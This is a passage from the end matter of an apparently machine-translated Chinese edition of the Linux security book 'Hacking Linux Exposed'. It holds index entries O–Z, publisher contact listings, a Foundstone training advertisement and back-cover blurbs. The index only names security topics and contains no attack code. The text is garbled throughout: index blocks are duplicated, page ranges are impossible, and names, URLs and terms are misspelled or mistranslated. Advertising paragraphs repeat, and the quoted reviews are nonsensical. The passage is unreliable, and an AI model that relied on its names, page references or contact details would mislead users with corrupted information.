- 一次密码 (OTPs), 312
- 在线手册, 426–437
- 在线搜索, 70–73
- open() 函数, 450, 455
- Open Relay 行为缓解系统 (ORBS), 383
- 开放路径优先 (OSPF), 217, 219
- 开源软件, 4–5
- open 系统调用, 278
- OpenSSH, 226, 326
- OpenSSL 库, 424
- Open Linux 补丁, 34
- 操作系统调用, 452–455
- 默认配置, 186–187
- 探测, 96–100
- 双启动系统, 163–164
- 指纹识别, 103–108
- 硬化, 32–36
- 伪装, 106
- 网络标识符, 101–103
- 开放端口, 101
- 扫描器, 24–27
- 单用户模式, 62, 167–172, 362
- SNMP 与, 101–102
- OIE (One Passwords in Everything) 工具, 312
- ORBs (开放 Relay 行为缓解系统), 383
- OSPF (开放路径优先), 217, 219
- OTPs (一次密码), 312

## P

- 软件包安装, 663
- 软件包管理工具, 492–499
- 数据包过滤, 477–480
- 数据包过滤器, 239–241
- Cisco Pix 数据包过滤器, 486
- 描述, 478
- 糟糕, 477
- 数据包过滤防火墙, 476, 477–480
- 数据包
  - 接受, 478
  - 拒绝, 478–479
  - 描述, 477
  - 防火墙策略, 483–485
  - 网络广播, 221
  - 路由, 229
  - 源路由, 217–218
- packetstorm 网站, 298, 299
- PAM 库, 345–347
- PAM (可插身份模块), 304–305, 311, 345–347
- 被动指纹识别, 106–108
- 密码命令, 260–261, 303
- 密码文件, 321
- 密码程序, 310
- 密码攻击, 285
- 更改, 320–321
- 新用户, 61
- 空字符, 451
- 无密码访问, 158
- 命令, 332–326
- SSH, 325–329
- 暴力破解攻击
  - 明明文, 255–256, 289–394
  - 默认, 187–192
  - 已删除, 286
  - 方法, 307, 313
  - 拨号访问, 255
  - 字典攻击, 289, 290
  - 不同系统, 300–310
  - 加密的, 178, 255–256, 286–289
  - 环境变量, 257
  - /etc/passwd 文件, 253, 299–305, 320–322
  - 强制密码程序, 310–311
  - FTP 与, 304–395
  - 正在, 196–199
  - 引导, 306–309
  - 历史文件, 257
  - HTTP 认证, 421–424, 435
  - 身份密码, 328–329
  - 长度, 196, 198
  - ILO 与, 164–172
  - 在 Linux 中, 284–289
  - 魔法密码, 344–345
  - MD5 密码, 313
  - 在多机器上, 293
  - 网络, 190–192, 199
  - 网络设备, 191–120
  - 用户账户, 320
  - 密码程序, 310–311
  - 一次程序 (OPTs), 312
  - OIE 系统, 312
  - PAM 库, 345–347
  - 密码程序+, 310
  - 密码破解程序, 289–299, 311
  - PGP 与, 304
  - Piranha 服务器, 190–191
  - 可插身份验证模块, 304–305, 311
  - POP-客户端, 391
  - 预防, 158
  - 保护, 299,305–313
  - 可恢复, 255
  - 要求, 198–199
  - 可逆的 bash, 253–254
  - root 密码, 190,194
  - 屏幕保护程序, 160–161
  - 安全 ID 系统, 312
  - 影子密码, 292, 296, 299–303
  - S/Key OTP 系统, 312
  - 嗅探器与, 193–194, 226
  - 存储, 253–257
  - Sudo 工具与, 260–265
  - 在系统文件中, 254–255
  - UNIX 密码, 328–329
  - 用户文件, 253–254
  - 网站, 304
- AV 命令, 399, 401–404
- PASV FTP 数据劫持, 401–404
- 补丁
  - 内核补丁, 34,25, 277
  - no-setroot, 322, 323
- Openwall Linux, 34
- Postix, 308
- 木马, 144
- 路径, 250–253
- PDAs (个人数据助手), 162–163
- 网络性能, 183

## 索引 557

- 点 () 符号, 251-252, 466, 467
- 管道
- Perl 代码
  - 利用, 454-455
  - CGI 命令与, 443-444
  - 检查数据长度, 447
  - 打开, 454-191
- Perl 语言, 5, 6, 293, 538
- Piranha 虚拟服务器, 190-191
- Perl 脚本, 333-334
- 密码程序, 398
- 可插身份验证模块, 304–305, 311
- POP-客户端, 391
- 预防, 158
- 保护, 299,305–313
- 可恢复, 255
- 要求, 198–199
- 可逆的 bash, 253–254
- root 密码, 190,194
- 屏幕保护程序, 160–161
- 安全 ID 系统, 312
- 影子密码, 292, 296, 299–303
- S/Key OTP 系统, 312
- 嗅探器与, 193–194, 226
- 存储, 253–257
- Sudo 工具与, 260–265
- 在系统文件中, 254–255
- UNIX 密码, 328–329
- 用户文件, 253–254
- 网站, 304

# 破解 Linux：安全秘籍与解决方案

- 安全和，414
- SMTP 标幅, 376
- SMTP EXPN 命令, 379
- 垃圾邮件和，382, 384
- VRFY 响应, 388
- 全局 mailidrop 目录, 386–387
- PDD Hysteria, 174
- 良好的隐私保护 (PGP): 参见 PGP
- 打印机, 访问, 254
- 权限提升攻击, 272–282
- 特权端口, 21
- 权限
  - 提升, 247–282
  - root 用户, 248–250
  - 用户, 248–250
- /proc 文件系统, 34
- 进程:
  - 隐藏, 340–341
  - 杀死, 20–21
  - 报告, 340–341
  - 发送信号, 20–21
  - 可疑, 61
- 主要规则, 385
- ProtoFTP, 397–398
- 编程流, 272–282
- 程序。参见软件
  - 删除, 49
  - 辅助应用程序, 268
  - 安装, 49
  - 保持最新, 491–499
  - 日志级别, 37
  - 密码破解, 289–299
  - 密码和， 304
  - 权限, 48
  - 特木马, 138–139
  - 未清理, 501–508
  - 升级, 420
- 混杂模式, 60, 192–193
- 协议栈, 178
- 协议, 178–184, 225–226
- 代理
  - 描述, 188
  - HTTP, 438–439
  - 代理防火墙, 477
  - 代理服务器, 438–439, 476, 477
- ps 命令, 319
- PTR 记录, 87
- 公共电话网络, 184–186
- Publicfile FTP 服务器, 414
- public_html 目录, 438
- ppwck 程序, 301–302
- pwconv 程序, 302
- pwunconv 程序, 302
- qmail
  - 描述, 372
  - 邮件中继和， 382
  - 加密和， 388
  - 邮件服务器文件权限, 380
  - 资源限制, 385
  - 非 root 运行, 374
  - 安全和， 414
  - SMTP 标幅, 375
  - SMTP EXPN 命令, 379
  - 垃圾邮件和， 382, 384
  - VRFY 响应, 377
- 查询, DNS, 82–87
- ques 工具, 103–104
- 配额, 17–18
- r-命令, 239–241, 323–327
- 竞态条件, 272–274
- Raw men, 149–152, 413
- Raymond, Eric, 5–6
- RBL (实时黑名单), 383
- rblsmptd, 384
- rcf.d 条目, 504–508
- rcp 命令, 323–324
- RCP 服务器, 109
- ract 程序, 506–507
- READ 访问, 35
- 实时黑名单 (RBL), 383
- 恢复, 59–66
- Red Hat 发行版
  - chconfig 程序, 504–505
  - 管理 rpm.d 条目, 504–505
  - Pimal 密码安全, 190–191
  - 关闭服务, 504–505
- Red Hat Package Manager (RPM), 492–494
- 引用主机, 447–448
- 重新安装系统, 63
- 远程访问
  - 漏洞, 259
  - 黑客和， 61
  - 无密码和， 323–326
  - r-命令和， 323–326
  - 嗅探器和， 193, 194
- 远程过程调用。参见 RPC
- 报告程序, 294
- 资源耗尽攻击, 475–476
- 资源, 509-512
- 报复攻击, 65-66
- RETR 命令, 409
- RETR 条目, 414
- 反向攻击, 65-66
- 反向 DNS 条目, 469-471
- 反向 identd 扫描, 97, 100
- 反向查找, 66-68
- hosts 文件, 325, 327-328
- hosts 变量, 328
- RSA 变量, 327
- RIP (路由信息协议), 219
- 哈希函数, 56
- rip 工具, 365
- rlogin 命令, 323–324
- rmmod 程序, 353
  - root 账户
    - 访问, 321–323
    - 创建, 249
    - root 用户, 564
    - 绑定, 5
    - hosts 等于, 324–325
    - inode 文件, 332
    - 日志文件, 40
    - NFS 卷, 111
    - 密码, 294
    - 防止攻击, 348–349
    - set 等, 348–349
    - 弱用户账户, 282
    - inetd 配置, 330–331
    - 应对措施, 331, 335
    - 使用 Netcat 创建, 332–335
    - 网络访问, 329–338
    - 单用户模式和， 167
    - 杀死进程, 21
    - 邮件服务器和， 373–374
    - 权限, 248–250
    - 木马和, 139
    - 病毒和， 118
    - 转发和， 190
    - rootkits, 61, 362–365
    - rootlets, 128
    - rot 算法, 286
    - 路由守护 (routed), 220
    - 路由器, 217–220
    - 路由, 217–218
    - 路由守护, 220
    - 路由数据包, 220
    - RPC (远程过程调用), 108
    - RPC 端口, 108
    - RPC 扫描, 96
    - RPC 服务器, 108–110
    - rpcinfo 命令, 108–109, 319
    - rpc-mount 服务, 200, 201
    - rpc-stat 服务, 200
    - rpm 命令, 264, 493–494
    - RSA 算法, 423
    - RSA 令牌
    - RSA 库, 423–424
    - rsh 客户端, 21
    - rsh 命令, 323–324
    - rsh 标志, 182
    - run 文件, 292
    - 启动过程和， 168
    - 切换, 503
    - 默认实例, 502
    - 目录, 503
    - Red Hat Linux, 504–505
    - 单用户模式, 168
    - 标准定义, 502
    - SuSE Linux, 505–507
    - S 文件, 503
    - SAINT (安全管理员集成网络工具), 118–119
    - salt 参数, 287
    - Samba 包, 254
    - SARA (安全审计员助手), 120
    - SATAN (网络分析管理员工具), 30, 118–119
    - 扫描器, 30–31
    - 日志文件, 504
    - 网络扫描器, 24, 27–32
    - 用于网络服务, 539–540
    - 端口扫描探测器, 29–32, 97
    - 安全扫描器, 24–29
    - 速度, 67
    - 系统扫描器, 24–27
    - TCP 端口, 91–100
    - 来自第三方网络/机器, 28–29
    - UDP 端口, 91–92
    - Web 服务器, 528–529

![](img/33829ffb1435b4baef56fcd2c28ec6cd_590_0.png)

# 破解 Linux：Linux 安全秘密

- SCP, 194
- 屏幕保护, 160–161
- ScriptAlias 指令, 431
- script
  - 扫描器, 24–29
- 监控摄像头, 166, 167
- 系统加固, 32–36
- “通过箭术”, 429–430
- 旅行和， 162–163
- 缓冲区溢出, 146–147, 201–202
- CGI, 440–442
- 条件的, 281–282
- 应对措施, 202
- 默认, 202
- 显式脚本, 145–146
- IRC 访问, 152
- IRC 脚本, 152–153
- Perl, 536–537
- 权限, 48
- 用于屏幕截图, 189
- 启动脚本, 48
- Unix Shell 访问, 153
- 漏洞, 201–202
- 用于网络分析的安全工具 (SAINT), 118–119
- 安全管理员集成网络工具 (SAINT), 118–119
- 安全审计员助手 (SARA), 120
- 安全漏洞, 145
- 安全焦点网站, 440
- sendmail, 371–372
- 搜索引擎, 71
- 邮件列表, 71
- 新闻群组, 71–73
- 在线, 70–73
- 安全 FTP (FTP), 194
- 安全哈希算法, 56
- 安全连接, 422–424
- Shell Socket 层, Systemd, 199, 332
- 安全
  - 标幅, 102, 375
  - 邮件中继, 381–382
  - 加密和， 388
  - EXPN 命令, 378–379
  - 邮件服务器文件, 529
  - 探测, 380
  - 资源限制, 384–385
  - 以 root 运行, 374
  - SMTP 服务器, 345
  - 垃圾邮件和, 381–382
  - VRFY, 376–377
  - sendmail 文件, 102–103
  - sendmail, 374–375
  - 服务器证书, 232
  - 服务器房间, 访问, 521
  - 服务器端包含 (SSI), 437
  - 服务器, 367–457
  - Apache Web 服务器, 246
  - 破解, 62–63
  - 探测入侵, 59–62
  - 禁用本地工具, 343
  - 编辑器和， 26–263
  - 邮件, 370–391
  - 伪安全/测试, 144
  - FTP, 391–414
  - FTP 服务器, 391, 392
  - 获取, 64–65
  - 处理敏感信息, 159
  - 笔记本电脑盗, 162–163
  - 邮件服务器, 375–391, 414
  - 邮件列表, 551
  - 管理用户, 6–22
  - 新闻群组, 21–22, 512
  - 新闻群组, 21–22
  - 开源软件和, 5–6
  - 物理安全, 155–175
  - 措施, 174–175
  - 主动措施, 24–60
  - 从系统剔除黑客, 64–65
  - 从入侵中恢复, 59–66
  - 扫描探测器, 29–32
  - 缓冲区溢出, 200–201
  - DoS 攻击, 202–204
  - 识别, 206–207
  - TCP wrappers, 208
  - 调整, 207–208, 503–508
  - 需要, 501–508
  - 会话劫持, 220–272

![](img/33829ffb1435b4baef56fcd2c28ec6cd_591_0.png)

# 索引 581

- setgroupids, 25, 252–253, 265–271, 387
- setreuid() 调用, 355, 356
- setuid() 调用, 355–356–370
- setuser
  - 二进制文件, 270
  - 游戏攻击, 269
  - 挂载文件系统, 269–271
  - 措施, 269
  - root shell, 321–323
- setuserid 程序, 25, 62–252–253, 265–271
- setuid 位, 25
- setxid 程序, 25, 348–349
- STP 安全 (FTP), 194, 326
- sh (Bourne shell), 81
- shadmrg.sv脚本, 292
- shadow 密码, 293–294
  - 二进制文件, 310
  - 命令, 302–303
- 破解程序和， 292
  - 描述, 301–302
  - 启用, 302
- John the Ripper 程序和， 296
- 密码过期, 311–312
- 移除, 302
- shell 账户, 316–317
- shell 环境, 8
- shell
  - 守护账户, 321
  - 默认, 7
  - 类型, 8
- show 命令, 111–114
- 信号
  - 描述, 20
  - HUP 信号, 21
  - 发送进程, 20–21
- 签名, PFC, 143–144
- 简单网络管理协议。每 SNMP
- 简单看门狗 (Swatch), 42–44
- 单用户模式, 62, 167–169

# 破解 Linux 暴露：Linux 安全秘密与解决方案

- 预防措施，136–137
- 奖励策略，135–136
- 策略，131–136
- 同情策略，132–133
- 软件。另见程序
- 检测版本，113
- 获取信息关于，113
- 潜在的木马风险，113
- Snowizard 产品，486

- 源代码
- 比较版本，140–141
- 关于 FTP 的技巧，139–140
- Linux 内核，359
- Perl，344–444
- 接收，140–141
- 被植入木马的，138–134
- 源路由，217–218
- 源路由包，100
- 垃圾邮件邮件：
- 阻塞垃圾邮件，383–384
- 阻塞垃圾邮件发送者 IP 地址，381
- 电子邮件中继，381–382
- 木马以及，144
- 身份欺骗攻击，216–217
- Squid 导入，178
- SSH 客户端，21, 22–29
- nsh 连接，317–518
- sh 守护进程 (shhd)，47
- SSH (安全外壳)
- 应对措施，327–329
- dniff 程序，227
- 加密 POW，带，390
- ftp 密码和，395
- 身份文件，328–329
- 无密码登录，带，326–329
- TCP wrappers 和，471
- 隧道功能，336–337
- xX 会话，190
- SSH 服务器，228–229
- SSH 工具，194
- ssh1，326
- ssh2，326
- shd (守护进程)，47
- sshhmit 程序，227, 228–229
- SSHv2 协议，229
- SSL 服务器（服务器索引），143
- SSL 证书，220–232
- SSL (安全套接层)
- 连接，232
- cookies 和，449
- dniff 程序和，227
- 加密，256
- HTTP 请求和，422–424
- 对比 TLS，426
- 网页服务器和，424
- StackGuard 编译器，267
- 栈，不可执行的，34
- START SERVICE 变量，508
- STARTTLS 扩展，388–389
- 启动脚本，48
- 状态化事务，479–480
- 状态检查，479–480
- 状态包过滤器，477
- 状态检查，55–56
- 隐蔽扫描，94–97
- 隐蔽 YN 扫描，94
- 权限系统，166, 13–14
- 粘性位 (sticky bits)，334
- 字符串，267–268
- 闪光工具，92–94
- stunnelnel，390, 422–472
- SSL 隧道， 封装，529–531
- sudo 工具，259, 260–265
- uxEXEC，433
- suidper 解释器，265
- Suitespot 程序，186
- Suitespot 服务器，186
- Suitespr 程序，271
- sulgin 命令，166, 169
- sum 程序，432
- 特权用户 (susers)，89
- Linux 内核和，361
- 已启用和，248–250
- 监控摄像头，166, 167
- SuSE Linux 发版，505–508
- Swatch (简单看门狗)，42
- swatch 文件，444
- 交换网络，193–194, 221–223
- 交换机，523–525
- 符号链接 (symbolic links)，274–279
- Apache 网页服务器和，427–428
- 危险，427–428
- 文件操作和，277–278
- SYN ACK 标志，182
- SYN 标志，182
- SYN 洪水攻击，237–239
- SYN 包，94, 96, 238–239
- SYN 扫描，94, 100
- syslog 设施的，36–37–38
- syslog 消息，36–39
- syslog 配置文件，37–39
- syslog 配置，36–39
- syslog 守护进程，36, 339–340
- 系统调用，452–453
- 系统守护进程，249
- 系统文件，254–255
- 系统功能，452–455
- 系统加固，32–36
- 系统入侵检测 (IDS)，248
- 系统程序，木马，338–351
- 系统扫描器，24–27
- 系统工具，351
- 系统用户，99
- 系统校验，141–143

# 索引 563

- TCP wrappers，483
- 未授权的，464–465
- 到网页服务器，418–419
- httpd 服务器，456
- Tiger 工具，26
- 波浪线 (tilde)，42
- 时间炸弹，63–64
- 时间戳，46–48
-生存时间 (TTL)，88–90
- 防火墙 Toolkit，392
- tar 命令，264
- TCFS 文件系统，173
- TCP 连接，220, 227
- TCP 检测，31
- TCP 头部，180, 181
- TCP 包，97, 103
- TCP/IP 网络，178–184, 236–339
- TCP 程序，422
- tcpnice 程序，227
- tcpserver 程序，372, 475
- tcpwrapper 文件，66
- Teardrop 攻击，237
- teleint 命令，503
- 电话号码，452
- JavaScript 预处理，451–452
- 定位，137, 157
- telnet 标志页，102
- telnet 客户端，184
- telnet 连接应用层协议，184
- 阻塞，483
- CGI 程序，443
- 拒绝，467–468
- 资源耗尽攻击，475–476
- TLS (传输层安全) 协议，389, 424
- -resource-exhaustion attacks，475–476
- TLS (传输层安全) 协议，389, 424
- tmp 目录，34
- tmap 功能，273
- top 命令，293
- touch 命令，46
- 追踪，982
- 传输控制协议 (Transmission Protocol)，180–181
- 传输层安全 (TLS) 协议，424
- triplex 发行，164
- tripwire 库，51–52
- 特洛伊马，136
- 后门，344–351
- 二进制文件，138, 139, 338–351
- 应对措施，113, 350–351
- 交付方法，144–206
- 电子邮件和，139
- 手页，113
- netstat 命令，203–205
- userid 程序，251, 252, 332-338–351
- 源代码，138, 139–144
- 系统程序，338–351
- 踪迹隐藏，338–343
- 受信任的路径和，250–253
- 对比宇宙，146
- 植木马，338
- 信任关系，21, 239–241
- 信任域，470–471
- 受信任主机，111
- 受信任路径，250–253
- 生存时间 (TTL)，88, 89–90
- 隧道功能，336–337
- U
- uds-sn, net-snmp
- UCE (未经许可商业邮件)。垃圾邮件
- UDP 检测，31, 32
- UDP 洪水，233–234

![](img/33829ffb1435b4ef562c28ec6cd_594_0.png)

# 破解 Linux 暴露：Linux 秘密

- UDP 头部，181
- 拒绝，90, 481–482
- drop 程序和，216
- 追踪输出，88
- UDP 端口扫描，91–112, 207
- SNMP 和，115
- UDP (用户数据报协议)，181–182
- limit 命令，18–19
- umask 命令，15
- umask 服务器，258
- umask 值，14–16
- Unicode 漏洞，425
- UNIX 密码，149, 152, 328–329
- UNIX平台
- IRC 脚本和，153
- 日志文件，36–39
- 病毒，148
- UNIX 追踪，88–89
- unshadowed 程序，296
- 未经请求的商业邮件 (UCE)。垃圾邮件
- 升级
- Debian，495–498
- Red Hat，492–494
- 允许双双点的 URL，224–425
- 空字符和，451
- 嗅探，227
- Userart 程序，227
- use 命令，250
- Usenet 组，512
- Usenet 帖子
- 作为信息收集工具，137
- 用于特洛伊马交付，144
- 用户访问，316–323
- 用户账户，320–321
- 用户数据报协议 (User Datagram Protocol)
- 用户文件，253–254
- 用户 ID，7, 9, 248
- useradd 命令，264, 303
- userdel 命令，303
- userowned 命令，303
- HTTP 认证，421–424
- 嗅探器和，193–194
- 用户，6–22
- 认证规则，344–345
- Linux 和，147
- Melissa 病毒，146
- 传播方法，147
- 扫描软件，148
- UNIX 和，148
- 对比特洛伊，146
- VMail. 另见 Postfix
- VMW，164
- VRFY 命令，367–377

![](img/33829ffb1435b4ef562c28ec6cd_595_1.png)

- Wall, Larry，6
- 保护，185–186
- 是，6
- 机密数据关于，420–424
- 拒绝服务攻击，232–239
- 域名名，73–75
- 防火墙。另见 firewalls
- 邮件列表，71–73
- newgroups，70–73
- 包。另见 packets
- 保护数据，421
- telnet. Telnet 连接
- 网页浏览器，
- HTTP 请求，418–425
- 网页农场，455–456
- cookies。另见 cookies
- 篡改，60
- JavaScript，451–452
- 密码保护，304
- 引用页，448

![](img/33829ffb1435b4ef562c28ec6cd_595_2.png)

# 索引 585

- 网页服务器，417–457
- AOL 服务器，456
- Apache 网页服务器，456
- awk-http 服务器，456
- bash-http 服务器，456
- 缓冲区溢出，265
- Bugtrap，71
- Checkpoint，486
- 机密信息关于，420–421
- COPS，25
- Crack 程序，290, 294
- 加密，422–424
- 防火墙脚本，460
- 防火墙 Toolkit，486
- 软浮路由器，486
- Guardillet 服务器，486
- GNU 隐私卫，388
- 破解暴露，512
- 破解信息，511–512
- 万圣节文档，6
- 不安全的 CGAs 和，431–434
- ISPs 和，455–456
- Jigsaw 服务器，456
- John the Ripper 算法，295
- Linux 权限，29
- Linux 发行，250
- Linux 内核代码，359
- whiteis 服务器，456
- Whois 工具，440
- whois 字符，283, 516
- whois 命令，73, 51
- whois 数据库，77
- whois 查询，76–77
- whois-admin 和 数据库，76–77
- 通配符，467
- 窗口扫描，96

- Windows 平台
- 双启动，163–164
- 指纹识别和，105–106
- 操作系统检测和，106
- 工作场所
- 攻击到，156–163
- 垃圾桶倾倒 (dumpster dive)，158–159
- 员工目录，137
- 信息收集工具，137
- 预防措施，158
- 蠕虫，146–152。也病毒
- 描述，146
- 电子邮件程序和，147
- 文件共享和，147
- Linux 和，148
- 传播方法，147
- Morris 网上蠕虫，149, 371
- Ramenzer 蠕虫，149–152, 413
- UNIX 和，152。另见 TCP 破解

# 566 破解 Linux 入门：Linux 安全秘密与解决方案

- 写入访问（WRITE access）,35
- 写入权限, 13
- twtmp 文件, 61
- wu-fpfd 标幅, 396–398
- wu-fppd 服务, 200, 201
- xinit 程序, 189
- Xkey 程序, 189
- 圣诞树扫描（Xmas Tree scans）, 95, 96, 100
- Xscan 程序, 189

+   X
- X Windows 系统, 189–190
- X11 转发, 190
- xconff-pl 程序, 462–464
- Xftp FTP 客户端, 405, 407
- xhost 设施, 189
- xxinetd, 461–464
    - 配置, 462–464
    - 特性, 461–462
    - 主机访问控制, 467–469
    - 概述, 461–464
- 资源耗尽与, 475–476

+   Y
- YaST（另一个启动工具）, 508
- YaST2, 508

+   Z
- 区域传输（zone transfers）, 84–86

# 国际联系信息

澳大利亚
McGraw-Hill Book Company Australia Pty. Ltd.
电话 +61-2-9417-9899
传真 +61-2-9417-5687
[http://www.mcraw-hill.com.au](http://www.mcraw-hill.com.au)
books-it_sydney@mcraw-hill.com

新加坡（服务亚洲）
McGraw-Hill Book Company
电话 +65-863-1580
传真 +65-862-3354
[http://www.mcraw-hill.com.sg](http://www.mcraw-hill.com.sg)
mghasia@mcraw-hill.com

加拿大
McGraw-Hill Ryerson Ltd.
电话 +905-430-5020
传真 +905-430-5020
[http://www.mcrawhill.ca](http://www.mcrawhill.ca)

南非
McGraw-Hill South Africa
电话 +27-11-622-7512
传真 +27-11-622-9045
robyn_swaneepo@mcraw-hill.com

希腊、中东、
北非
McGraw-Hill Hellas
电话 +30-1-656-0990-3/4
传真 +30-1-654-5525

英国与欧洲
（不包括南欧）
McGraw-Hill Education Europe
电话 +44-1-628-502500
传真 +44-1-628-770224
[http://www.mcraw-hill.co.uk](http://www.mcraw-hill.co.uk)
computing_neurope@mcraw-hill.com

墨西哥（同时也服务拉丁美洲）
McGraw-Hill Interamericana S.A. de C.V.
电话 +525-117-1583
传真 +525-117-1589
[http://www.mcraw-hill.com.mx](http://www.mcraw-hill.com.mx)
fernando_castellanos@mcraw-hill.com

所有其他咨询联系：
Osborne/McGraw-Hill
电话 +1-510-549-6600
传真 +1-510-883-7600
[http://www.osborne.com](http://www.osborne.com)
omg_international@mcraw-hill.com

# FOUNDSTONE

Foundstone 是顶尖的安全咨询与培训机构。我们在最高水平上积累了经验，包括美国空军、黑色防御承包商以及五大咨询公司中的三家。这就是为什么领先的 .com 公司和全球 2000 企业依赖 Foundstone 来保障企业安全。

Foundstone 的业务是协助并教育你有关计算机安全的各个方面，以便你能够保护自己快速变化的环境。《破解之旅：网络安全秘密与解决方案》的作者也为你带来了 Foundstone 的《终极破解：实战》（Ultimate Hacking: Hands On）课程。通过 Foundstone 的培训课程，你将受益于书籍背后的集体智慧，并获得多年与黑客斗争的专家实战指导。

在涉及到保护公司免受黑客攻击时，Foundstone 的培训和咨询服务是无价的。让我们的专家教你如何防御你的组织，以免让黑客教给你一个让你难忘的教训。

Foundstone 的明星团队已准备好将其知识运用于为你服务。请访问我们的网站：...

www.foundstone.com
1 877-91FOUND

*保护 .com 世界*

# 揭秘
每一个可能的威胁

完全修订的《破解之旅》第二版，包含了你让计算机系统不落入黑客手中所需的最新信息。以下是你将获得的：

- 超过 220 多页全新内容，涵盖技术建议和案例研究
- 对针对互联网用户、网络浏览器、电子邮件软件的攻击的新覆盖，外加病毒、蠕虫等等
- 一个关于 Windows 2000 攻击和防御措施的大型章节，包括系统漏洞的加密
- 关于电子商务膨胀和最新反黑客方法的更新信息

![](img/33829ffb1435b4baef56cd28eccd_600_0)

Joel Scamray、Stuart McClure 和 George Kurtz 联手创建了本权威指南。在涉及到保护公司免受黑客攻击时，Foundstone 的培训和咨询服务是无价的。让我们的专家教你如何防御你的组织，以免让黑客教给你一个让你难忘的教训。

Foundstone 的明星团队已准备好将其知识运用于为你服务。请访问我们的网站

Joel Scamray、Stuart McClure 和 George Kurtz 联手创建了本权威指南。在涉及到保护公司免受黑客攻击时，Foundstone 的培训和咨询服务是无价的。让我们的专家教你如何防御你的组织，以免让黑客教给你一个让你难忘的教训。

Foundstone 的明星团队已准备好将其知识运用于为你服务。请访问我们的网站

www.foundstone.com
1 877-91FOUND

*保护 .com 世界*

# 揭秘
每一个可能的威胁

完全修订的《破解之旅》第二版，包含了你让计算机系统不落入黑客手中所需的最新信息。以下是你将获得的：

- 超过 220 多页全新内容，涵盖技术建议和案例研究
- 对针对互联网用户、网络浏览器、电子邮件软件的攻击的新覆盖，外加病毒、蠕虫等等
- 一个关于 Windows 2000 攻击和防御措施的大型章节，包括系统漏洞的加密
- 关于电子商务膨胀和最新反黑客方法的更新信息

![](img/33829ffb1435b4baef56cd28eccd_600_0)

Joel Scamray、Stuart McClure 和 George Kurtz 联手创建了本权威指南。在涉及到保护公司免受黑客攻击时，Foundstone 的培训和咨询服务是无价的。让我们的专家教你如何防御你的组织，以免让黑客教给你一个让你难忘的教训。

Joel Scamray、Stuart McClure 和 George Kurtz 联手创建了本权威指南。在涉及到保护公司免受黑客攻击时，Foundstone 的培训和咨询服务是无价的。让我们的专家教你如何防御你的组织，以免让黑客教给你一个让你难忘的教训。

Hacking Exposed, Second Edition
Joel Scamray, Stuart McClure and George Kurtz
39.99

> "Hacking Exposed, Second Edition 是你所买过的最好的书。"
> "Hacking Exposed, Second Edition 提供了安全信息。"
> "Hacking Exposed, Second Edition 是最知名的安全。"
> "我向读者推荐 Hacking Exposed, Second Edition。"
> "Hacking Exposed, Second Edition 提供了坚实基础"
> "Hacking Exposed, Second Edition 是揭露的。"

![](img/33829ffb1435b4baef56cd28eccd_600_1)

# 破解 Linux 入门
秘密与解决方案

学习像黑客一样思考以保护你的网络

在不断变化的全球数据通信、廉价连接和快速软件开发的世界中，安全不断受到破坏。Linux 一直被认为是黑客的数字乐场。《破解之旅：安全与解决方案》一步步教你如何通过理解黑客的方法来防御。你将追踪他们的踪迹。每个章节都分为易于理解的部分，涵盖了广为人知的技巧和鲜为人知的技巧。

- 详细介绍每个 Linux 发行版的安全特性，包括 Red Hat Linux、SuSE 和 Debian
- 使用跟踪路由、区域传输、操作系统检测、Ping 扫描和端口扫描发现漏洞系统
- 检测后门、密码破解器、欺骗、会话劫持和轨迹隐藏
- 实现日志分析工具，如高级入侵检测引擎 (AIDE) 和高级内核补丁，包括 Linux 入侵检测系统 (LIDS)
- 学习防止本地用户获取 root 权限
- 防止拒绝攻击和其他网络攻击
- 安全地配置 FTP 站点、DNS 服务器和其他守护进程
- 使用安全技术、验证和安全的 Apache 配置防御 Web 服务器攻击
- 设计、部署和测试安全防火墙和其他网络访问限制

# 作者：

Brian Hatch 是 FoundSight 的 UNIX/Linux 安全咨询顾问、管理员和专家黑客。他曾在西北大学教过各种课程，是广泛使用的 SSL 封装工具 Stunnel 的维护者。

James Lee 是 Perl 黑客、Linux 管理员、安全咨询顾问和开源倡导者。James 是 FoundSight Inc. 的创始人兼 CEO，这专注于 Perl 培训和 Web 开发的咨询公司。

George Kurtz 是国际畅销书《破解之旅：网络安全秘密与解决方案》的合作者，FoundSight Inc. 的 CEO，这是一家顶尖的安全咨询与培训公司。

![](img/33829ffb1435b4baef56cd28eccd_603_0.png)

```
